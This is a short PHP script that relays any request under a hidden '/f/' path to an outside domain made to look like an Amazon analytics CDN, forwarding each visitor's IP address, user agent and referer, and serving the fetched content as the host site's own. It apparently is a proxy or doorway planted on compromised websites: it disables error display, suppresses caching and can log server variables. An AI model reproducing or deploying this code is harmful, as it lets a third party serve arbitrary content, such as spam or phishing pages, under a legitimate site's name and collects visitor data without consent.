<?php

ini_set('display_errors', 0);
error_reporting( E_ALL);

$log = false;

function get_data_yo($url)
{
    global $log;
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];

    $headers = array(
        'Cache-Control: no-cache',
        'User-Agent: ' . $ua,
        'X-Forwarded-For:' . $ip,
    );

    if ($log) {
        file_put_contents('log.txt', json_encode($_SERVER) . PHP_EOL, FILE_APPEND);
        file_put_contents('log.txt', json_encode($headers) . PHP_EOL, FILE_APPEND);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_REFERER, !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : (empty($_SERVER['REQUEST_SCHEME']) ? 'http' : ($_SERVER['REQUEST_SCHEME'])) . "://{$_SERVER['HTTP_HOST']}");     
    $data = curl_exec($ch);
	if ($log) {
		echo 'Ошибка curl: ' . curl_error($ch);
	}
    curl_close($ch);
    return $data;
}

$url = 'https://amazon-analytics-cdn-23.com/magirartherapie';
$url = preg_replace('#/$#', '', $url);
$dir = 'f';
$dir = preg_replace('#^/#', '', $dir);
$dir = preg_replace('#/$#', '', $dir);
$uri = trim(strip_tags($_SERVER['REQUEST_URI']));

// file_put_contents('log.txt', 1);

if (preg_match("#^/{$dir}/#", $uri)) {
    $reUri = preg_replace("#/{$dir}#", '', $uri, 1);
    $content = get_data_yo($url . $reUri);
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");
    
    echo $content;
    exit();
}
